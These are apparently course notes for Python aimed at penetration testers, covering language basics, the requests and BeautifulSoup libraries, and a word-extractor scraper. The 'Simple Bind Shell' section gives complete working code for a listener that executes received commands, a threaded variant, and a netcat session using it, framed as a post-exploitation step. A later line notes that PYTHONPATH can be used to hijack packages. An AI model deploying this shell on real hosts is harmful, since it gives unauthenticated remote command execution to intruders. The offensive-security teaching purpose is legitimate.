- [Python](#python)
  - [Intro](#intro)
    - [Executing Python Code](#executing-python-code)
      - [IDLE](#idle)
      - [Shebang #!](#shebang-)
  - [Variables](#variables)
    - [Strings](#strings)
    - [Format Strings](#format-strings)
    - [Integers](#integers)
    - [Booleans](#booleans)
    - [Comments](#comments)
  - [Coding Style](#coding-style)
  - [Conditional Statements / Loops](#conditional-statements--loops)
    - [if-(elif)-else](#if-elif-else)
    - [while](#while)
    - [for-each-loop](#for-each-loop)
  - [Functions](#functions)
    - [Function Call](#function-call)
  - [OOP](#oop)
  - [Libraries](#libraries)
    - [Managing Libraries](#managing-libraries)
    - [Importance of Libraries](#importance-of-libraries)
      - [requests](#requests)
      - [BeautifulSoup](#beautifulsoup)
  - [Project: Word Extractor](#project-word-extractor)
    - [Word Extractor Improvements](#word-extractor-improvements)
      - [main-Block](#main-block)
      - [Accepting Arguments](#accepting-arguments)
  - [Project: Simple Bind Shell](#project-simple-bind-shell)
  - [Advanced Libraries](#advanced-libraries)
    - [Directories and Search Paths](#directories-and-search-paths)
    - [venv](#venv)

---

# Python

Python is an interpreted language, which means the code itself is not compiled into machine code like C code. Instead, it is interpreted by the Python program, and the instructions in the script(s) are executed. Python is a high-level language meaning the scripts you produce are simplified for your convenience so that you don't need to worry about memory management, system calls, and so forth. Furthermore, Python is a general-purpose, multi-paradigm language.

## Intro

### Executing Python Code

There are many ways to execute a piece of Python code. Two of the most frequently used methods are running the code from a ```.py``` file and running it directly inside the Python IDLE. The file-based way is handy when developing an actual script and the IDLE way is very useful for quickly testing something small.

Basic example:

```python
print("Hello Academy!")
```

Terminal usage example:

```bash
d41y@htb[/htb]$ vim welcome.py
d41y@htb[/htb]$ python3 welcome.py

Hello Academy!
```

#### IDLE

You can use IDLE directly in your terminal for quicker prototyping. You can launch this by executing the Python binary without any arguments.

Example:

```bash
d41y@htb[/htb]$ python3

Python 3.9.0 (default, Oct 27 2020, 14:15:17) 
[Clang 12.0.0 (clang-1200.0.32.21)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> 4 + 3
7
>>> foo = 3 * 5
>>> foo
15
>>> foo + 4
19
>>> print('Hello Academy!')
Hello Academy!
>>> exit(0)
```

When evaluating an expression, the result will be printed on the line below if a result is returned. However, if the expression is stored as a variable, nothing will be printed as nothing is returned.

Python executes the code from the top to the bottom. Python has no clue what is further down in the script until it gets to it. If you were to print a variable instead of a literal value, it must be defined before referencing.

```python
>>> greeting = 'Hello again, Academy'
>>> print(greeting)
Hello again, Academy
```

#### Shebang #!

Another method is based on adding the shebang (```#!/usr/bin/env python3```) in the first line of a Python script. On Unix based OSs, marking this with a pound sign and an exclamation mark causes the following command to be executed along with all of the specified arguments when the program is called. You can give the Python script execution rights and execute it directly without entering ```python``` at the beginning on the command line. The file name is then passed as an argument.

Example:

```python
#!/usr/bin/env python3

print("Hello Academy!")
```

```bash
d41y@htb[/htb]$ chmod +x welcome.py
d41y@htb[/htb]$ ./welcome.py

Hello Academy!
```

## Variables

Example:

```python
advice = "Don't panic"
ultimate_answer = 42
potential_question = 6 * 7
confident = True
something_false = False
problems = None
# Oh, and by the way, this is a comment. We can tell by the leading # sign.
```

### Strings

Strings in Python can be specified using both ```"``` and ```'```. When typing out strings that contain either symbol as a natural part of the string itself, it is a good idea to use the other kind of quotes.

### Format Strings

```python
equation = f'The meaning of life might be {6 * 7}.'  # -> The meaning of life might be 42.

me = 'Birb'
greeting = f'Hello {me}!'  # -> Hello Birb!
```

A format string is a string that lets you populate the string with values during runtime.

### Integers

### Booleans

A boolean value is a truth value and can either be ```True``` or ```False```. ```None``` is a special "nothingness" of a value similar to ```null``` in other languages. The usefulness of this value is, that it allows you to define variables in the code but not give them a concrete value just yet. It also allows you to create a more meaningful program flow and decide to pass along either some data or ```None``` in case of errors. Moreover, it allows you to return it as a value if "none of something" was found.

### Comments

Comments work the same way in Python as they do in all other languages: they are ignored when the program runs and are only for the developers' eyes. It can sometimes be advisible to use comments to remember what a piece of code does or explain some oddity. However, it is strongly recommended to write clean and simple code that will not need further explanation other than the code itself.

## Coding Style

In Python, variable names follow the snake_case naming convention. This means that variable names should be all lower case initially, and an underscore should separate any potential need for multiple words in the name. While ignoring these naming conventions will not cause any issues for the script, other Python developers may get thrown off if they expect one set of rules but face others.

## Conditional Statements / Loops

### if-(elif)-else

```python
happy = True

if happy:
    print("Happy and we know it!")
else:
    print("Not happy...")
```

Python does not require how wide each indentation must be, as long as there is consistency.

Besides indentations, ```if``` and ```else``` are introduced. First, you define a variable, which is currently ```True```. Then you check ```if``` the variable ```happy``` is ```True```, and if it is, then you print "Happy and we know it!" to the terminal. If ```happy``` is ```False```, then the ```else``` block is executed instead, and "Not happy..." is printed to the terminal.

You also have to consider the situation that you want to bring in more than just two different options. The ```elif``` expression means that you continue with this one if the previous condition is not met. Basically, ```elif``` is the shorthand notation of nested ```if``` statements.

Example:

```python
happy = 2

if happy == 1:
    print("Happy and we know it!")
elif happy == 2:
    print("Excited about it!")
else:
    print("Not happy...")
```

### while

```python
counter = 0

while counter < 5:
    print(f'Hello #{counter}')
    counter = counter + 1
```

A while-loop is a loop that will execute its content as long as the defined condition is ```True```. This means that ```while True``` will run forever, and ```while False``` will never run.

Output:

```python
d41y@htb[/htb]$ vim loop1.py
d41y@htb[/htb]$ python3 loop1.py

Hello #0
Hello #1
Hello #2
Hello #3
Hello #4
```

### for-each-loop

```python
groceries = ['Walnuts', 'Grapes', 'Bird seeds']

for food in groceries:
    print(f'I bought some {food} today.')
```

The for-each loop is structured this way: first the ```for``` keyword, then the variable name you choose, followed by the ```in``` keyword and a collection to iterate over.

## Functions

... let you define code blocks that perform a range of actions, produce a range of values, and optionally return one or more of these values. 

In Python, you can define and call functions to reuse code and work with your data more efficiently.

Example:

```python
def f(x):
    return 2 * x + 5
```

The ```def``` keyword is how you define functions in Python. Following ```def``` comes the function name, input parameters inside the parantheses, and a colon. The first line of a function is called the signature of the function.

### Function Call

```python
def power_of(x, exponent):
    return x ** exponent

power_of(4, 2)  		# The function was run, but nothing caught the return value.
eight = power_of(2, 3)  # Variable "eight" is now equal to two-to-the-power-of-three.
```

... and:

```python
print('My favourite number is:')
print(power_of(4, 2))
```

Here you are calling the function ```print``` and giving it first a string as input, and next, you are giving it the result of another function call. At runtime, Python will first execute the first line and then go to the 2nd line and execute the commands from inside out. It will, start by calculating ```power_of(4, 2)``` and then use this result as input to the ```print``` function.

Imagine if you were to call a function with ten parameters. Having to remember each parameter is challenging once the amount of parameter increases above two, so in addition to these positiona parameters, Python supports what is called named parameters. While positional parameter require yout to always insert the parameters in the correct order, named parameters let you use whichever order you prefer. However, they require you to specify which value goes to which parameter explicitly.

Example:

```python
def print_sample_invitation(mother, father, child, teacher, event):

    # Notice here the use of a multi-line format-string: f''' text here '''
    sample_text = f'''
Dear {mother} and {father}.
{teacher} and I would love to see you both as well as {child} at our {event} tomorrow evening. 

Best regards,
Principal G. Sturgis.
'''
    print(sample_text)

print_sample_invitation() # error because you did not provide any arguments for the print_sample_invitation function
```

Usage:

```python
print_sample_invitation(mother='Karen', father='John', child='Noah', teacher='Tina', event='Pizza Party')
```

## OOP

Cooking recipes and classes are much alike because they define how a dish - or some object - is produced. A cake might have a fixed amount of flour and water, but leave it up to the chef to add chocolate or strawberry frosting. A class is a spec of how an object of some type is produced. The result of instantiating such a class is an object of the class.

Example:

```python
class DreamCake:
    # Measurements are defined in grams or units
    eggs = 4
    sugar = 300 
    milk = 200
    butter = 50
    flour = 250
    baking_soda = 20
    vanilla = 10

    topping = None
    garnish = None

    is_baked = False

    def __init__(self, topping='No topping', garnish='No garnish'):
        self.topping = topping
        self.garnish = garnish
    
    def bake(self):
        self.is_baked = True

    def is_cake_ready(self):
        return self.is_baked
```

Classes are defined using the ```class``` keyword, followed by the name of the class, in the CapWords naming convention.

Notice the ```self``` parameter at the ```__init__``` function. This parameter is a mandatory, first parameter of all class functions. Classes need a way to refer to their own variables and functions. Python is designed to require a ```self``` parameter in the first position of the function signature. You can refer to other functions within class functions by calling ```self.other_func()``` or ```self.topping```.

Another little trick to notice is the default values for function parameters. These allow you to completely commit specifying a value for one or more of the parameters. The parameters will then be set to their default values as specified unless overridden when you create an object.

## Libraries

... are collections of knowledge that you can borrow in your projects without reinventing the wheel. Once you import a library, you can use everything inside it, including functions and classes.

Example:

```python
import datetime

now = datetime.datetime.now()
print(now)  # Prints: 2021-03-11 17:03:48.937590
```

> [!TIP]
> You can use the ```as``` statement to give the imported library a new name.<br><br>
> Example:<br>
> ```from datetime import datetime as dt```

### Managing Libraries

The most popular way of installing external packages in python is by using ```pip```. With pip, you can install, uninstall and upgrade Python packages.

Installing example:

```python
d41y@htb[/htb]$ # Syntax: python3 -m pip install [package]
d41y@htb[/htb]$ python3 -m pip install flask

Collecting flask
  Using cached Flask-1.1.2-py2.py3-none-any.whl (94 kB)
Collecting Werkzeug>=0.15
  Using cached Werkzeug-1.0.1-py2.py3-none-any.whl (298 kB)
Collecting itsdangerous>=0.24
  Using cached itsdangerous-1.1.0-py2.py3-none-any.whl (16 kB)
Collecting click>=5.1
  Using cached click-7.1.2-py2.py3-none-any.whl (82 kB)
Collecting Jinja2>=2.10.1
  Downloading Jinja2-2.11.3-py2.py3-none-any.whl (125 kB)
     |████████████████████████████████| 125 kB 7.0 MB/s 
Collecting MarkupSafe>=0.23
  Downloading MarkupSafe-1.1.1-cp39-cp39-macosx_10_9_x86_64.whl (16 kB)
Installing collected packages: Werkzeug, itsdangerous, click, MarkupSafe, Jinja2, flask
Successfully installed Jinja2-2.11.3 MarkupSafe-1.1.1 Werkzeug-1.0.1 click-7.1.2 flask-1.1.2 itsdangerous-1.1.0
```

Upgrading example:

```python
d41y@htb[/htb]$ python3 -m pip install --upgrade flask

Requirement already up-to-date: flask in /usr/local/lib/python3.9/site-packages (1.1.2)
Requirement already satisfied, skipping upgrade: itsdangerous>=0.24 in /usr/local/lib/python3.9/site-packages (from flask) (1.1.0)
Requirement already satisfied, skipping upg...
<SNIP>
```

Uninstalling example:

```python
d41y@htb[/htb]$ pip uninstall [package]
```

To see what is currently installed you can use ```freeze```:

```python
d41y@htb[/htb]$ # Syntax: python3 -m pip freeze [package]
d41y@htb[/htb]$ python3 -m pip freeze

click==7.1.2
Flask==1.1.2
itsdangerous==1.1.0
Jinja2==2.11.3
MarkupSafe==1.1.1
protobuf==3.13.0
pynput==1.7.3
pyobjc-core==7.1
pyobjc-framework-Cocoa==7.1
pyobjc-framework-Quartz==7.1
six==1.15.0
Werkzeug==1.0.1
```

Pip also supports maintaining packages from a requirements file. This file contains a list of all the required packages needed to run the script successfully.

```requirements.txt``` example:

```python
d41y@htb[/htb]$ cat requirements.txt

flask
click
```

Install from ```requirements.txt``` example:

```python
d41y@htb[/htb]$ python3 -m pip install -r requirements.txt
```

> [!TIP]
> You can also specify which packagen version to install by using ```==```, ```<=```, ```>=```, ```<``` or ```>```.<br>
> This can be useful, if you know that some package is vulnerable to exploitation at versions x and lower.

### Importance of Libraries

#### requests

The ```requests``` library is an elegant and simple HTTP library for Python, which allows you to send HTTP/1.1 requests extremely easily.

Installing:

```python
d41y@htb[/htb]$ python3 -m pip install requests

Collecting requests
  Downloading requests-2.25.1-py2.py3-none-any.whl (61 kB)
     |████████████████████████████████| 61 kB 3.8 MB/s
Collecting chardet<5,>=3.0.2
  Downloading chardet-4.0.0-py2.py3-none-any.whl (178 kB)
     |████████████████████████████████| 178 kB 6.8 MB/s
Collecting certifi>=2017.4.17
...SNIP...
Successfully installed certifi-2020.12.5 chardet-4.0.0 idna-2.10 requests-2.25.1 urllib3-1.26.3
```

Once installed, you can import the library into your code.

The two most useful things to know about the requests library are making HTTP requests, and secondly, it has a ```Session``` class, which is useful when you neet to maintain a certain context during your web activity. For example, if you need to keep track of a range of cookies, you could use a ```Session``` object.

```requests``` example:

```python
import requests

resp = requests.get('http://httpbin.org/ip')
print(resp.content.decode())

# Prints:
# {
#   "origin": "X.X.X.X"
# }
```

This is a simple example of how to perform a GET request to obtain your public IP address. Since the ```resp.content``` variable is a byte-string, a string of bytes that may or may not be printable, you have to call ```decode()``` on the object. Decoding the byte-string with the ```decode()``` function and no parameters tells Python to interpret the bytes as UTF-8 chars, which is the default encoding used when no other encoding is specified. The ```resp``` object contains useful information such as the status_code, the numeric HTTP status code of the request you made, and cookies.

#### BeautifulSoup

This library makes working with HTML a lot easier in Python. BS turns the HTML into Python objects that are much more easier to work with and allows you to analyze the content better programmatically.

Installing BS:

```python
d41y@htb[/htb]$ python3 -m pip install beautifulsoup4

Collecting beautifulsoup4
  Downloading beautifulsoup4-4.9.3-py3-none-any.whl (115 kB)
     |████████████████████████████████| 115 kB ...
Collecting soupsieve>1.2
  Downloading soupsieve-2.2-py3-none-any.whl (33 kB)
Installing collected packages: soupsieve, beautifulsoup4
Successfully installed beautifulsoup4-4.9.3 soupsieve-2.2
```

Usage example - html:

```html
<html>
<head><title>Birbs are pretty</title></head>
<body><p class="birb-food"><b>Birbs and their foods</b></p>
<p class="food">Birbs love:<a class="seed" href="http://seeds" id="seed">seed</a>
   and 
   <a class="fruit" href="http://fruit" id="fruit">fruit</a></p>
 </body></html>
```

Usage example - with BS:

```python
from bs4 import BeautifulSoup

html_doc = """ html code goes here """
soup = BeautifulSoup(html_doc, 'html.parser')
print(soup.prettify())
```

... turns into:

```html
<html>
 <head>
  <title>
   Birbs are pretty
  </title>
 </head>
 <body>
  <p class="birb-food">
   <b>
    Birbs and their foods
   </b>
  </p>
  <p class="food">
   Birbs love:
   <a class="seed" href="http://seeds" id="seed">
    seed
   </a>
   and
   <a class="fruit" href="http://fruit" id="fruit">
    fruit
   </a>
  </p>
 </body>
</html>
```

## Project: Word Extractor

First, you need to import the ```requests``` library, then you can use it to GET the URL and print it out:

```python
import requests

PAGE_URL = 'http://target:port'

resp = requests.get(PAGE_URL)
html_str = resp.content.decode()
print(html_str)
```

What happens if you misspell the URL:

```python
>>> r = requests.get('http://target:port/missing.html')
>>> r.status_code

404
>>> print(r.content.decode())

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
    </body>
</html>
```

If you were expecting that the HTML output contains specific elements that you then tried to access and use, your Python program would crash while trying to use things that do not exist.

Simple fail check:

```python
import requests

PAGE_URL = 'http://target:port'

resp = requests.get(PAGE_URL)

if resp.status_code != 200:
    print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
    exit(1)

html_str = resp.content.decode()
print(html_str)
```

It is advisible to keep things simple and separate:

```python
import requests

PAGE_URL = 'http://target:port'

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

print(get_html_of(PAGE_URL))
```

Functionalities to implement are:
- find all words on the page, ignoring the HTML tags and other metadata
- count the occurence of each word and note it down
- sort by occurence
- do something with the most frequently occuring words (_print them_)

For the first step to find all words in the HTML while ignoring HTML tags, you can use regex. If you use the ```get_text()``` function, you can use the regular expression module ```re``` to get some help. This module has a ```findall``` function which takes some string of regex and some text as parameters and then returns all occurences in a list. You can use the regex string ```\w+```, which matches all word chars, that is a-z, A-Z, 0-9 and _.

```python
import requests
import re
from bs4 import BeautifulSoup

PAGE_URL = 'http://target:port'

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

html = get_html_of(PAGE_URL)
soup = BeautifulSoup(html, 'html.parser')
raw_text = soup.get_text()
all_words = re.findall(r'\w+', raw_text) # creates list of all words from the webpage including duplicates
```

The next step is to loop through this list and count each word:

```python
# Previous code omitted
all_words = re.findall(r'\w+', raw_text)

word_count = {}

for word in all_words:
    if word not in word_count:
        word_count[word] = 1
    else:
        current_count = word_count.get(word)
        word_count[word] = current_count + 1
```

The comes sorting:

```python
top_words = sorted(word_count.items(), key=lambda item: item[1], reverse=True)
```

... and printing top 10 values:

```python
>>> top_words = sorted(word_count.items(), key=lambda item: item[1], reverse=True)
>>> for i in range(10):
...    print(top_words[i])
```

Since it is working now, you can refactor it:

```python
import requests
import re
from bs4 import BeautifulSoup

PAGE_URL = 'http://target:port'

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

def count_occurrences_in(word_list):
    word_count = {}

    for word in word_list:
        if word not in word_count:
            word_count[word] = 1
        else:
            current_count = word_count.get(word)
            word_count[word] = current_count + 1
    return word_count

def get_all_words_from(url):
    html = get_html_of(url)
    soup = BeautifulSoup(html, 'html.parser')
    raw_text = soup.get_text()
    return re.findall(r'\w+', raw_text)

def get_top_words_from(all_words):
    occurrences = count_occurrences_in(all_words)
    return sorted(occurrences.items(), key=lambda item: item[1], reverse=True)

all_words = get_all_words_from(PAGE_URL)
top_words = get_top_words_from(all_words)

for i in range(10):
    print(top_words[i][0])
```

### Word Extractor Improvements

#### main-Block

```python
if __name__ == '__main__':
    page_url = 'http://target:port'
    the_words = get_all_words_from(page_url)
    top_words = get_top_words_from(the_words)

    for i in range(10):
        print(top_words[i][0])
```

Python scripts are executed from top to bottom, even when imported. This means that if somebody were to import your script, the code would run as soon as imported. The typical way to avoid this is to put all the code that does something into the main-block

#### Accepting Arguments

Example:

```bash
d41y@htb[/htb]$ python3 wordextractor.py --url http://foo.bar/baz
```

For this, you will need ```click```.

```click``` Example:

```python
import click

@click.command()
@click.option('--count', default=1, help='Number of greetings.')
@click.option('--name', prompt='Your name', help='The person to greet.')
def hello(count, name):
    for i in range(count):
        click.echo('Hello %s!' % name)

if __name__ == '__main__':
    hello()
```

First of all, there are decorators which, "decorate functions". These are the things about the function definition that starts with an ```@```. You specify the ```@click.command``` decorator, indicating that you will have a command-line input for this ```hello``` function. Then two ```@click.option``` options are specified. In this example, the parameters are pretty straightforward: you have a default for the count, in case that is not specified as a command-line argument, you have ```help``` text for the ```--help``` output, and you have a ```prompt``` parameter. This tells Python to prompt the user for input if no command-line argument is given.

Lastly, notice all the "main part" of the code does is call the ```hello()``` function. Click requires you to call function with these decorators specified to work. Also, notice that the parameter names for the function ```hello``` and the input argument names ```--count``` and ```--name``` match names if you ignore the ```--```.

Examples:

```
C:\Users\Birb> python click_test.py

Your name: Birb
Hello Birb!

C:\Users\Birb> python click_test.py --name Birb

Hello Birb!

C:\Users\Birb> python click_test.py --name Birb --count 3

Hello Birb!
Hello Birb!
Hello Birb!

C:\Users\Birb> python click_test.py --help

Usage: click_test.py [OPTIONS]

Options:
  --count INTEGER  Number of greetings.
  --name TEXT      The person to greet.
  --help           Show this message and exit.
```

Using ```click``` on Word Extractor:

```python
import click
import requests
import re
from bs4 import BeautifulSoup

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

def count_occurrences_in(word_list, min_length):
    word_count = {}

    for word in word_list:
        if len(word) < min_length:
            continue
        if word not in word_count:
            word_count[word] = 1
        else:
            current_count = word_count.get(word)
            word_count[word] = current_count + 1
    return word_count

def get_all_words_from(url):
    html = get_html_of(url)
    soup = BeautifulSoup(html, 'html.parser')
    raw_text = soup.get_text()
    return re.findall(r'\w+', raw_text)

def get_top_words_from(all_words, min_length):
    occurrences = count_occurrences_in(all_words, min_length)
    return sorted(occurrences.items(), key=lambda item: item[1], reverse=True)

@click.command()
@click.option('--url', '-u', prompt='Web URL', help='URL of webpage to extract from.')
@click.option('--length', '-l', default=0, help='Minimum word length (default: 0, no limit).')
def main(url, length):
    the_words = get_all_words_from(url)
    top_words = get_top_words_from(the_words, length)

    for i in range(10):
        print(top_words[i][0])

if __name__ == '__main__':
    main()
```

## Project: Simple Bind Shell

Upon gaining access to an internal web service with the credentials you generated, you can get remote code execution on the web host. Trying to use your go-to reverse shell mysteriously does not seem to work, but you discover that you can execute arbitrary python scripts.

A bind shell is at its core reasonably simple. It is a process that binds to an address and port on the host machine and then listens for incoming connections to the socket. When a connection is made, the bind shell will repeatedly listen for bytes being sent to it and treat them as raw commands to be executed on the system in a subprocess. Once it has received all bytes in chunks of some size, it will run the command on the host system and send back the output.

```python
import socket
import subprocess
import click

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)
    client_socket, address = s.accept()

    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

if __name__ == '__main__':
    main()
```

The code consists of two functions: a wrapper function for executing commands on the system and one main function that contains all the logic thrown into one place. This is less than ideal. The main function sets up a socket, binds it to ```0.0.0.0``` and the desired port. It is then configured to allow at most four unaccepted connections before it starts refusing connections anymore - the ```listen``` function configures this. The socket then accepts new incoming connections. This is a so-call blocking call, which means the code will halt at this line of code and wait for a connection to be made. When a connection is established, the accept call returns two things that you store in the variables ```client_socket``` and ```address```.

Inside the while-loop:

- receive all of the incoming bytes from the connected client
- convert the incoming bytes to a ```cmd``` string
- close down the connection if ```cmd``` is "exit"
- otherwise execute the command locally and send back the output

Starting the Bind Shell:

```
C:\Users\Birb\Desktop\python> python bindshell.py --port 4444
```

Connecting to the Bind Shell:

```bash
d41y@htb[/htb]$ nc 10.10.10.10 4444 -nv

(UNKNOWN) [10.10.10.10] 4444 (?) open

whoami
localnest\birb

hostname
LOCALNEST

dir 
Volume in drive C has no label.
 Volume Serial Number is 966B-6E6A

 Directory of C:\Users\Birb\Desktop\python

20-03-2021  21:22    <DIR>          .
20-03-2021  21:22    <DIR>          ..
20-03-2021  21:22               929 bindshell.py
               1 File(s)            929 bytes
               2 Dir(s)  518.099.636.224 bytes free
exit
```

> [!NOTE]
> The downside of the current implementation is that once you disconnected, the bind shell process stops. One way to fix this is to introduce threads and have the command execution part of the code run in a thread.

Supporting multiple connections:

```bash
import socket
import subprocess
import click
from threading import Thread

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

def handle_input(client_socket):
    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)

    while True:
        client_socket, _ = s.accept()
        t = Thread(target=handle_input, args=(client_socket, ))
        t.start()

if __name__ == '__main__':
    main()
``` 

## Advanced Libraries

Packages physically exist in a predetermined location so that the Python interpreter can locate the packages when you try to import them or elements from inside them. The default location is the ```site-packages``` directory. This is true for Windows systems, however on Debian and Debian-based systems the external libraries are located inside a ```dist-packages``` location.

- Windows
  - ```C:\Program Files\Python38\Lib\site-packages```
- Linux
  - ```/usr/lib/python3/dist-packages```

### Directories and Search Paths

Instead of producing a fully functional script for scraping words off a website, you decided to write the script as an API. You could package the script together with an ```__init__.py``` file and replace the package inside the site-packages directory. Python already knows to check this location when searching for packages. This is not always practical. However, you can tell Python to look in a different directory before searching through the site-packages directory by specifying the ```PYTHONPATH``` environment variable.

```python
d41y@htb[/htb]$ python3

Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> sys.path
['', '/usr/lib/python39.zip', '/usr/lib/python3.9', '/usr/lib/python3.9/lib-dynload', '/usr/local/lib/python3.9/dist-packages', '/usr/lib/python3/dist-packages', '/usr/lib/python3.9/dist-packages']

>>>
```

Now specify a ```PYTHONPATH``` environment variable and see how it affects the search path:

```python
d41y@htb[/htb]$ PYTHONPATH=/tmp/ python3

Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> sys.path
['', '/tmp/', '/usr/lib/python39.zip', '/usr/lib/python3.9', '/usr/lib/python3.9/lib-dynload', '/usr/local/lib/python3.9/dist-packages', '/usr/lib/python3/dist-packages', '/usr/lib/python3.9/dist-packages']

>>>
```

Since you set the ```PYTHONPATH``` to the root directory, this has been prepended to the search path. This means two things: first of all, the packages that exist in ```/tmp/``` location can now be imported and used in the project or IDLE, and secondly, it means you can highjack other packages changing the behavior. The latter point is a bonus if you can control the ```PYTHONPATH``` of a system to include your malicious code.

Suppose you wanted to have the packages installed in a specific folder. For example, you wanted to keep all packages related to you inside some ```/var/www/packages``` directory. In that case, you can have pip install the package and store the content inside this folder with the ```--target``` flag:

```bash
d41y@htb[/htb]$ python3 -m pip install --target /var/www/packages/ requests

Collecting requests
  Using cached requests-2.25.1-py2.py3-none-any.whl (61 kB)
Collecting urllib3<1.27,>=1.21.1
  Downloading urllib3-1.26.4-py2.py3-none-any.whl (153 kB)
     |████████████████████████████████| 153 kB 8.1 MB/s
...SNIP...
```

### venv

If you, for one reason or the other, need to use one specific version of a package for one project and another version of the same package for another project, you will face problems. One solution for this kind of isolation of projects is using virtual environments. The ```venv``` module allows you to create virtual environments for your projects, consisting of a folder structure for the project environment itself, a copy of the Python binary and files to configure your shell to work with this specific environment.

Preparation:

```bash
d41y@htb[/htb]$ python3 -m venv academy
```

Next up, you can source the ```activate``` script located in ```academy/bin/```. This configures your shell, by setting up the required environment variables so that when you run ```pip install requests```, you will be using the Python binary that was copied as part of creating the venv:

```bash
Fugl@htb[/htb]$ source academy/bin/activate
(academy) Fugl@htb[/htb]$ pip install requests

Collecting requests
  Using cached requests-2.25.1-py2.py3-none-any.whl (61 kB)
Collecting idna<3,>=2.5
...SNIP...
Successfully installed certifi-2020.12.5 chardet-4.0.0 idna-2.10 requests-2.25.1 urllib3-1.26.4
```

Notice the ```(academy)``` prefix after sourcing the ```activate``` script. This indicates that your terminal is configured to run commands for that particular environment.